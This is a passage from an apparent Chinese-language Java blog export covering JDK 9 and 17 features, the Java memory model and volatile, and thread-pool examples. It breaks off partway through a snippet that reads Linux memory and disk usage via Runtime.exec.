<li>382:     新的 macOS 渲染管道</li>
<li>391:     支持原生的 Apple 的新 Arm 64 架构（Mac 的 M1 芯片）</li>
<li>398:     弃用 Applet API</li>
<li>403:     JDK 内部强封装</li>
<li>406:     为 switch 支持模式匹配</li>
<li>407:     移除 RMI 激活</li>
<li>409:     正式引入密封类，限制抽象类的实现</li>
<li>410:     移除实验性的 AOT 和 JIT 编译器</li>
<li>411:     弃用安全管理器</li>
<li>412:     外部函数和内存 API（孵化中）</li>
<li>414:     矢量 API（二次孵化中）</li>
<li>415:     上下文特定反序列化过滤器</li>
</ul>
<p>总结：虽然JDK17也是一个LTS版本，但是并没有像JDK8和JDK11一样引入比较突出的特性，主要是对前几个版本的整合和完善。</p>
<blockquote>
<p>Spring Boot 2.5.5是Spring Boot 第一个支持Java 17的版本</p>
</blockquote>
<p><a href="https://xie.infoq.cn/article/38330a064f0ba2991fbd3e924" target="_blank" rel="noopener">详细的了解新特性</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>JDK 9 新特性</title>
    <url>/Java/JDK%209%20%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p>Java 9 正式发布于 2017 年 9 月 21 日 。作为 Java8 之后 3 年半才发布的新版本，Java 9 带 来了很多重大的变化。其中最重要的改动是 Java 平台模块系统的引入。除此之外，还有一些新的特性</p>
<h2 id="Java-平台-模块系统"><a href="#Java-平台-模块系统" class="headerlink" title="Java 平台 模块系统"></a>Java 平台 模块系统</h2><p>Java 平台模块系统，也就是 Project Jigsaw，把模块化开发实践引入到了 Java 平台中。在引入了模块系统之后，JDK 被重新组织成 94 个模块。Java 应用可以通过新增的 jlink 工具，创建出只包含所依赖的 JDK 模块的自定义运行时镜像。这样可以极大的减少 Java 运行时环境的大小。这对于目前流行的不可变基础设施的实践来说，镜像的大小的减少可以节省很多存储空间和带宽资源 。</p>
<h2 id="Jshell"><a href="#Jshell" class="headerlink" title="Jshell"></a>Jshell</h2><p>jshell 是 Java 9 新增的一个实用工具。jshell 为 Java 增加了类似 NodeJS 和 Python 中的读取-求值-打印循环（ Read-Evaluation-Print Loop ） 。 在 jshell 中 可以直接 输入表达式并查看其执行结果。当需要测试一个方法的运行效果，或是快速的对表达式进行求值时，jshell 都非常实用。只需要通过 jshell 命令启动 jshell，然后直接输入表达式即可。每个表达式的结果会被自动保存下来 ，以数字编号作为引用，类似 $1 和$2 这样的名称 。可以在后续的表达式中引用之前语句的运行结果。 在 jshell 中 ，除了表达式之外，还可以创建 Java 类和方法。jshell 也有基本的代码完成功能。</p>
<p> 在代码清单 2 中，我们直接创建了一个方法 add。<br>清单 2. 在 jshell 中添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jshell&gt; <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; </span><br><span class="line">    ...&gt; <span class="keyword">return</span> x + y; </span><br><span class="line">    ...&gt; &#125; </span><br><span class="line"> | <span class="function">created method <span class="title">add</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span></span><br></pre></td></tr></table></figure>
<p>接着就可以在 jshell 中直接使用这个方法，如 代码清单 3 所示。<br>清单 3. 在 jshell 中使用创建的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jshell&gt; add(<span class="number">1</span>, <span class="number">2</span>) </span><br><span class="line">$<span class="number">19</span> ==&gt; <span class="number">3</span></span><br></pre></td></tr></table></figure>
<h2 id="集合、Stream-和-Optional"><a href="#集合、Stream-和-Optional" class="headerlink" title="集合、Stream 和 Optional"></a>集合、Stream 和 Optional</h2><p> 在集合上，Java 9 增加 了 List.of()、Set.of()、Map.of() 和 M ap.ofEntries()等工厂方法来创建不可变集合 ，如 代码清单 4 所示。<br>清单 4 . 创建不可变集合</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List.of(); </span><br><span class="line">List.of(<span class="string">"Hello"</span>, <span class="string">"World"</span>); </span><br><span class="line">List.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">Set.of(); </span><br><span class="line">Set.of(<span class="string">"Hello"</span>, <span class="string">"World"</span>); </span><br><span class="line">Set.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">Map.of();</span><br><span class="line">Map.of(<span class="string">"Hello"</span>, <span class="number">1</span>, <span class="string">"World"</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>Stream 中增加了新的方法 ofNullable、dropWhile、takeWhile 和 iterate。在 代码清单 5 中，流中包含了从 1 到 5 的 元素。断言检查元素是否为奇数。第一个元素 1 被删除，结果流中包含 4 个元素。<br>清单 5 . Stream 中的 dropWhile 方法示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDropWhile</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">long</span> count = Stream.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>) </span><br><span class="line">        .dropWhile(i -&gt; i % <span class="number">2</span> != <span class="number">0</span>) </span><br><span class="line">        .count(); </span><br><span class="line">    assertEquals(<span class="number">4</span>, count); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Collectors 中增加了新的方法 filtering 和 flatMapping。在 代码清单 6 中，对于输入的 String 流 ，先通过 flatMapping 把 String 映射成 Integer 流 ，再把所有的 Integer 收集到一个集合中。<br>清单 6 . Collectors 的 flatMapping 方法示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFlatMapping</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    <span class="keyword">final</span> Set&lt;Integer&gt; result = Stream.of(<span class="string">"a"</span>, <span class="string">"ab"</span>, <span class="string">"abc"</span>) </span><br><span class="line">        .collect(Collectors.flatMapping(v -&gt; v.chars().boxed(), </span><br><span class="line">            Collectors.toSet())); </span><br><span class="line">    assertEquals(<span class="number">3</span>, result.size()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Optiona l 类中新增了 ifPresentOrElse、or 和 stream 等方法。在 代码清单 7 中，Optiona l 流中包含 3 个 元素，其中只有 2 个有值。在使用 flatMap 之后，结果流中包含了 2 个值。<br>清单 7 . Optional 的 stream 方法示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testStream</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">long</span> count = Stream.of( </span><br><span class="line">        Optional.of(<span class="number">1</span>), </span><br><span class="line">        Optional.empty(), </span><br><span class="line">        Optional.of(<span class="number">2</span>) </span><br><span class="line">    ).flatMap(Optional::stream) </span><br><span class="line">        .count(); </span><br><span class="line">    assertEquals(<span class="number">2</span>, count); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="进程-API"><a href="#进程-API" class="headerlink" title="进程 API"></a>进程 API</h2><p>Java 9 增加了 ProcessHandle 接口，可以对原生进程进行管理，尤其适合于管理长时间运行的进程。在使用 P rocessBuilder 来启动一个进程之后，可以通过 Process.toHandle()方法来得到一个 ProcessHandl e 对象的实例。通过 ProcessHandle 可以获取到由 ProcessHandle.Info 表 示的进程的基本信息，如命令行参数、可执行文件路径和启动时间等。ProcessHandle 的 onExit()方法返回一个 C ompletableFuture<processhandle>对象，可以在进程结束时执行自定义的动作。 代码清单 8 中给出了进程 API 的使用示例。<br>清单 8 . 进程API 示例</processhandle></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">"top"</span>) </span><br><span class="line">    .inheritIO(); </span><br><span class="line"><span class="keyword">final</span> ProcessHandle processHandle = processBuilder.start().toHandle(); </span><br><span class="line">processHandle.onExit().whenCompleteAsync((handle, throwable) -&gt; &#123; </span><br><span class="line">    <span class="keyword">if</span> (throwable == <span class="keyword">null</span>) &#123; </span><br><span class="line">        System.out.println(handle.pid()); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        throwable.printStackTrace(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="平台日志-API-和-服务"><a href="#平台日志-API-和-服务" class="headerlink" title="平台日志 API 和 服务"></a>平台日志 API 和 服务</h2><p>Java 9 允许为 JDK 和应用配置同样的日志实现。新增的 System.LoggerFinder 用来管理 JDK 使 用的日志记录器实现。JVM 在运行时只有一个系统范围的 LoggerFinder 实例。LoggerFinder 通 过服务查找机制来加载日志记录器实现。默认情况下，JDK 使用 java.logging 模块中的 java.util.logging 实现。通过 LoggerFinder 的 getLogger()方法就可以获取到表示日志记录器的 System.Logger 实现。应用同样可以使用 System.Logger 来记录日志。这样就保证了 JDK 和应用使用同样的日志实现。我们也可以通过添加自己的 System.LoggerFinder 实现来让 JDK 和应用使用 SLF4J 等其他日志记录框架。 代码清单 9 中给出了平台日志 API 的使用示例。<br>清单 9.使用平台日志 API</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> System.Logger LOGGER = System.getLogger(<span class="string">"Main"</span>); </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> </span>&#123; </span><br><span class="line">        LOGGER.log(Level.INFO, <span class="string">"Run!"</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="反应式流-（-Reactive-Streams-）"><a href="#反应式流-（-Reactive-Streams-）" class="headerlink" title="反应式流 （ Reactive Streams ）"></a>反应式流 （ Reactive Streams ）</h2><p>反应式编程的思想最近得到了广泛的流行。 在 Java 平台上有流行的反应式 库 RxJava 和 R eactor。反应式流规范的出发点是提供一个带非阻塞负压（ non-blocking backpressure ） 的异步流处理规范。反应式流规范的核心接口已经添加到了 Java9 中的 java.util.concurrent.Flow 类中。</p>
<p>Flow 中包含了 Flow.Publisher、Flow.Subscriber、Flow.Subscription 和 F low.Processor 等 4 个核心接口。Java 9 还提供了 SubmissionPublisher 作为 Flow.Publisher 的一个实现。RxJava 2 和 Reactor 都可以很方便的 与 Flow 类的核心接口进行互操作。</p>
<h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><p>在并发方面，类 CompletableFuture 中增加了几个新的方法。completeAsync 使用一个异步任务来获取结果并完成该 CompletableFuture。orTimeout 在 CompletableFuture 没有在给定的超时时间之前完成，使用 TimeoutException 异常来完成 CompletableFuture。completeOnTimeout 与 o rTimeout 类似，只不过它在超时时使用给定的值来完成 CompletableFuture。新的 Thread.onSpinWai t 方法在当前线程需要使用忙循环来等待时，可以提高等待的效率。</p>
<h2 id="Nashorn"><a href="#Nashorn" class="headerlink" title="Nashorn"></a>Nashorn</h2><p>Nashorn 是 Java 8 中引入的新的 JavaScript 引擎。Java 9 中的 Nashorn 已经实现了一些 ECMAScript 6 规范中的新特性，包括模板字符串、二进制和八进制字面量、迭代器 和 for..of 循环和箭头函数等。Nashorn 还提供了 API 把 ECMAScript 源代码解析成抽象语法树（ Abstract Syntax Tree，AST ） ，可以用来对 ECMAScript 源代码进行分析。</p>
<h2 id="I-O-流新特性"><a href="#I-O-流新特性" class="headerlink" title="I/O 流新特性"></a>I/O 流新特性</h2><p>类 java.io.InputStream 中增加了新的方法来读取和复制 InputStream 中包含的数据。</p>
<ul>
<li>readAllBytes：读取 InputStream 中的所有剩余字节。</li>
<li>readNBytes： 从 InputStream 中读取指定数量的字节到数组中。</li>
<li>transferTo：读取 InputStream 中的全部字节并写入到指定的 OutputStream 中 。 </li>
</ul>
<p>代码清单 12 中给出了这些新方法的使用示例。<br>清单 12. InputStream 中的新方法使用示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> InputStream inputStream; </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String CONTENT = <span class="string">"Hello World"</span>; </span><br><span class="line">    <span class="meta">@Before</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUp</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">        <span class="keyword">this</span>.inputStream = </span><br><span class="line">            TestInputStream.class.getResourceAsStream("/input.txt"); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testReadAllBytes</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">        <span class="keyword">final</span> String content = <span class="keyword">new</span> String(<span class="keyword">this</span>.inputStream.readAllBytes()); </span><br><span class="line">        assertEquals(CONTENT, content); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="meta">@Test</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testReadNBytes</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">5</span>]; </span><br><span class="line">        <span class="keyword">this</span>.inputStream.readNBytes(data, <span class="number">0</span>, <span class="number">5</span>); </span><br><span class="line">        assertEquals(<span class="string">"Hello"</span>, <span class="keyword">new</span> String(data)); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="meta">@Test</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTransferTo</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">        <span class="keyword">final</span> ByteArrayOutputStream outputStream = <span class="keyword">new</span> ByteArrayOutputStream(); </span><br><span class="line">        <span class="keyword">this</span>.inputStream.transferTo(outputStream); </span><br><span class="line">        assertEquals(CONTENT, outputStream.toString()); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ObjectInputFilter 可以对 ObjectInputStream 中 包含的内容进行检查，来确保其中包含的数据是合法的。可以使用 ObjectInputStream 的方法 setObjectInputFilter 来设置。ObjectInputFilter 在 进行检查时，可以检查如对象图的最大深度、对象引用的最大数量、输入流中的最大字节数和数组的最大长度等限制，也可以对包含的类的名称进行限制。</p>
<h2 id="改进应用安全性能"><a href="#改进应用安全性能" class="headerlink" title="改进应用安全性能"></a>改进应用安全性能</h2><p>Java 9 新增了 4 个 SHA- 3 哈希算法，SHA3-224、SHA3-256、SHA3-384 和 S HA3-512。另外也增加了通过 java.security.SecureRandom 生成使用 DRBG 算法的强随机数。 代码清单 13 中给出了 SHA-3 哈希算法的使用示例。<br>清单 13. SHA-3 哈希算法使用示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Hex; </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SHA3</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException </span>&#123; </span><br><span class="line">        <span class="keyword">final</span> MessageDigest instance = MessageDigest.getInstance(<span class="string">"SHA3-224"</span>); </span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] digest = instance.digest(<span class="string">""</span>.getBytes()); </span><br><span class="line">        System.out.println(Hex.encodeHexString(digest)); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="统一-JVM-日志"><a href="#统一-JVM-日志" class="headerlink" title="统一 JVM 日志"></a>统一 JVM 日志</h2><p>Java 9 中 ，JVM 有了统一的日志记录系统，可以使用新的命令行选项-Xlog 来控制 JVM 上 所有组件的日志记录。该日志记录系统可以设置输出的日志消息的标签、级别、修饰符和输出目标等。Java 9 移除了在 Java 8 中 被废弃的垃圾回收器配置组合，同时 把 G1 设为默认的垃圾回收器实现。另外，CMS 垃圾回收器已经被声明为废弃。Java 9 也增加了很多可以通过 jcmd 调用的诊断命令。</p>
<h2 id="Java-语言本身改动"><a href="#Java-语言本身改动" class="headerlink" title="Java 语言本身改动"></a>Java 语言本身改动</h2><p>在 Java 语言本身，Java 9 允许在接口中使用私有方法。 在 try-with-resources 语句中可以使用 e ffectively-final 变量。 类 java.lang.StackWalker 可 以对线程的堆栈进行遍历，并且支持过滤和延迟访问。Java 9 把对 Unicode 的支持升级到了 8.0。ResourceBundle 加载属性文件的默认编码从 ISO-8859-1 改成了 UTF-8，不再需要使用 native2ascii 命 令来对属性文件进行额外处理。注解@Deprecated 也得到了增强，增加了 since 和 forRemoval 两 个属性，可以分别指定一个程序元素被废弃的版本，以及是否会在今后的版本中被删除。</p>
<p>在 代码清单 14 中，buildMessage 是接口 SayHi 中的私有方法，在默认方法 sayHi 中被使用。<br>清单 14. 接口中私有方法的示例<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SayHi</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">buildMessage</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHi</span><span class="params">(<span class="keyword">final</span> String message)</span></span>; </span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">sayHi</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        sayHi(buildMessage()); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="其他特性"><a href="#其他特性" class="headerlink" title="其他特性"></a>其他特性</h2><p>其他的看不懂，不写出来了。</p>
<p>更多信息请看 <a href="https://www.ibm.com/developerworks/cn/java/the-new-features-of-Java-9/index.html" target="_blank" rel="noopener">Java 9 新特性介绍</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>Java内存模型</title>
    <url>/Java/Java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<p>Java的内存模型(JMM)规定了所有的变量都是存在于 <code>主内存(RAM)</code> 当中的，而每个线程都有自己的<code>工作内存或者本地内存</code>，线程对变量的所有操作都必须在自己的<code>工作内存</code>中进行，而不能直接对<code>主内存</code>操作，并且每个线程都不能访问<code>其他线程</code>的<code>工作内存或者本地内存</code> 。</p>
<p>比如，在某个线程中对变量 <code>i</code> 的复制操作 <code>i=1</code>，改线程必须在本地内存中对 <code>i</code> 进行修改之后才能将其写入 <code>主内存</code> 之中。</p>
<h2 id="Java内存模型-JMM-三大特性"><a href="#Java内存模型-JMM-三大特性" class="headerlink" title="Java内存模型(JMM)三大特性"></a>Java内存模型(JMM)三大特性</h2><h3 id="一、原子性"><a href="#一、原子性" class="headerlink" title="一、原子性"></a>一、原子性</h3><p>所有操作都执行或者都不执行</p>
<p>如何保证原子性？<br>JMM只保证了基本读取和赋值的原子性操作，其他的不保证，如果想要使得某些代码片段具备原子性，<br>需要使用关键字synchronized，或者JUC中的lock。</p>
<p>总结：volatile关键字不具备保证原子性的语义</p>
<h3 id="二、有序性"><a href="#二、有序性" class="headerlink" title="二、有序性"></a>二、有序性</h3><p>程序代码在执行过程中的先后顺序（编译器优化会导致不是开发者写的顺序）<br>具有保证顺序性的语义</p>
<p>Java提供三种方式保证有序性：</p>
<ol>
<li>使用volatile保证有序性</li>
<li>使用synchronized保证有序性</li>
<li>使用显式锁Lock来保证有序性</li>
</ol>
<p>volatile 变量规则</p>
<blockquote>
<p>对一个变量的写操作要早于对这个变量之后的读操作。</p>
</blockquote>
<p>根据字面的意思来理解是，如果一个变量使用volatile关键字修饰，<br>一个线程对它进行读操作，一个线程对它进行写操作，那么写入操作肯定要先行发生于读操作</p>
<h3 id="三、可见性"><a href="#三、可见性" class="headerlink" title="三、可见性"></a>三、可见性</h3><p>当一个线程对共享变量进行修改，那么另外的线程可以立刻看到修改后的最新值。</p>
<p>Java提供三种方式保证可见性：</p>
<ol>
<li>使用关键字volatile，当一个变量被volatile修饰，对于共享资源的读操作直接在主内存中进行，<br>当其他线程对该共享资源进行修改，会导致当前线程在工作内存中的共享资源失效，所以必须从主内<br>存中再次获取，对于共享资源的写操作当然是先要修改工作内存，然后刷新到主内存。</li>
<li>synchronized能保证可见性</li>
<li>通过JUC的显式锁也能保证可见性。</li>
</ol>
<p>总结：volatile具有保证可见性的语义</p>
<h2 id="volatile关键字深入解析"><a href="#volatile关键字深入解析" class="headerlink" title="volatile关键字深入解析"></a>volatile关键字深入解析</h2><h3 id="语义"><a href="#语义" class="headerlink" title="语义"></a>语义</h3><p>被volatile修饰的实例变量或者类变量具备如下两层语义</p>
<ol>
<li>保证不同线程之间对共享变量操作时的可见性（一个线程修改，另外一个线程立刻看到最新值）</li>
<li>禁止对指令进行重排序操作。</li>
</ol>
<h2 id="volatile使用场景"><a href="#volatile使用场景" class="headerlink" title="volatile使用场景"></a>volatile使用场景</h2><ol>
<li>多线程之间变量的可见性</li>
<li>有序性</li>
</ol>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>Java线程池</title>
    <url>/Java/Java%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.demo;</span><br><span class="line"></span><br><span class="line">import java.util.concurrent.ExecutorService;</span><br><span class="line">import java.util.concurrent.Executors;</span><br><span class="line">import java.util.concurrent.ScheduledExecutorService;</span><br><span class="line">import java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		</span><br><span class="line">		System.out.println(Runtime.getRuntime().availableProcessors());</span><br><span class="line">		//testSingleThreadExecutor();</span><br><span class="line">		//testFixedThreadPool();</span><br><span class="line">		//testCachedThreadPool();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	/**</span><br><span class="line">	 * 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待</span><br><span class="line">	 */</span><br><span class="line">	public static void testFixedThreadPool()&#123;</span><br><span class="line">		//因为线程池大小为3，每个任务输出index后sleep 2秒，所以每两秒打印3个数字。</span><br><span class="line">		//定长线程池的大小最好根据系统资源进行设置。如获取cpu核心数Runtime.getRuntime().availableProcessors()</span><br><span class="line">		ExecutorService fixedThreadPool = Executors.newFixedThreadPool(3);  </span><br><span class="line">		for (int i = 0; i &lt; 10; i++) &#123;  </span><br><span class="line">			final int index = i;  </span><br><span class="line">			fixedThreadPool.execute(new Runnable() &#123;  </span><br><span class="line">				public void run() &#123;  </span><br><span class="line">					try &#123;  </span><br><span class="line">						System.out.println(index);  </span><br><span class="line">						Thread.sleep(2000);  </span><br><span class="line">					&#125; catch (InterruptedException e) &#123;  </span><br><span class="line">						e.printStackTrace();  </span><br><span class="line">					&#125;  </span><br><span class="line">				&#125;  </span><br><span class="line">			&#125;);  </span><br><span class="line">		&#125;  </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	/**</span><br><span class="line">	 * 创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。</span><br><span class="line">	 */</span><br><span class="line">	public static void testCachedThreadPool()&#123;</span><br><span class="line">		</span><br><span class="line">		ExecutorService cachedThreadPool = Executors.newCachedThreadPool();  </span><br><span class="line">		for (int i = 0; i &lt; 10; i++) &#123;  </span><br><span class="line">			final int index = i;  </span><br><span class="line">			try &#123;  </span><br><span class="line">				Thread.sleep(index * 1000);  </span><br><span class="line">			&#125; catch (InterruptedException e) &#123;  </span><br><span class="line">				e.printStackTrace();  </span><br><span class="line">			&#125;  </span><br><span class="line">			cachedThreadPool.execute(new Runnable() &#123;  </span><br><span class="line">				public void run() &#123;  </span><br><span class="line">					System.out.println(index);  </span><br><span class="line">				&#125;  </span><br><span class="line">			&#125;);  </span><br><span class="line">		&#125;  </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	/**</span><br><span class="line">	 * 创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行</span><br><span class="line">	 */</span><br><span class="line">	public static void testSingleThreadExecutor()&#123;</span><br><span class="line">		ExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();  </span><br><span class="line">		for (int i = 0; i &lt; 10; i++) &#123;  </span><br><span class="line">			final int index = i;  </span><br><span class="line">			singleThreadExecutor.execute(new Runnable() &#123;  </span><br><span class="line">				public void run() &#123;  </span><br><span class="line">					try &#123;  </span><br><span class="line">						System.out.println(index);  </span><br><span class="line">						Thread.sleep(2000);</span><br><span class="line">					&#125; catch (InterruptedException e) &#123;  </span><br><span class="line">						e.printStackTrace();  </span><br><span class="line">					&#125;  </span><br><span class="line">				&#125;  </span><br><span class="line">			&#125;);  </span><br><span class="line">		&#125;  </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	/**</span><br><span class="line">	 * 创建一个定长线程池，支持定时及周期性任务执行</span><br><span class="line">	 */</span><br><span class="line">	public static void testScheduledThreadPool()&#123;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		ScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(5);  </span><br><span class="line">		scheduledThreadPool.schedule(new Runnable() &#123;  </span><br><span class="line">			public void run() &#123;  </span><br><span class="line">				System.out.println(&quot;delay 3 seconds&quot;);  </span><br><span class="line">			&#125;  </span><br><span class="line">		//延迟3秒执行</span><br><span class="line">		&#125;, 3, TimeUnit.SECONDS); </span><br><span class="line">		//延迟1秒后每3秒执行一次。</span><br><span class="line">		//&#125;, 3, TimeUnit.SECONDS);  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>Java获取Linux系统资源信息</title>
    <url>/Java/Java%E8%8E%B7%E5%8F%96Linux%E7%B3%BB%E7%BB%9F%E8%B5%84%E6%BA%90%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">		</span><br><span class="line">	//cat /proc/meminfo</span><br><span class="line">	</span><br><span class="line">		String commands=&quot;cat /proc/meminfo&quot;;  </span><br><span class="line">		</span><br><span class="line">        //String message= runCommands(commands); </span><br><span class="line">        //System.out.println(message);</span><br><span class="line">		</span><br><span class="line">		getDiskInfo(1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static String runCommands(String commands) throws IOException&#123;</span><br><span class="line">		</span><br><span class="line">		Process process = Runtime.getRuntime().exec(commands);  </span><br><span class="line">        InputStreamReader ir = new InputStreamReader(process.getInputStream(), &quot;UTF-8&quot;);  </span><br><span class="line">        BufferedReader input = new BufferedReader(ir);  </span><br><span class="line">        String line;  </span><br><span class="line">        String message=&quot;&quot;;  </span><br><span class="line">        while ((line = input.readLine()) != null) &#123;  </span><br><span class="line">        	//System.out.println(&quot;+++&quot;+line);</span><br><span class="line">            message = message + line + &quot;\n&quot; ;  </span><br><span class="line">        &#125;</span><br><span class="line">        return message;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	public static List&lt;List&gt; getDiskInfo(int sda_number) throws IOException&#123;</span><br><span class="line">		String commands = &quot;df -h |grep /dev/sda&quot;+sda_number;</span><br><span class="line">//		String commands = &quot;df -h&quot;;</span><br><span class="line"></span><br><span class="line">		Process process = Runtime.getRuntime().exec(commands);  </span><br><span class="line">        InputStreamReader ir = new InputStreamReader(process.getInputStream(), &quot;UTF-8&quot;);  </span><br><span class="line">        BufferedReader input = new BufferedReader(ir);  </span><br><span class="line">        String line;  </span><br><span class="line">        </span><br><span class="line">        List&lt;List&gt; result = new ArrayList();</span><br><span class="line">        /**</span><br><span class="line">         * [文件系统, 容量, 已用, 可用, 已用%, 挂载点]</span><br><span class="line">		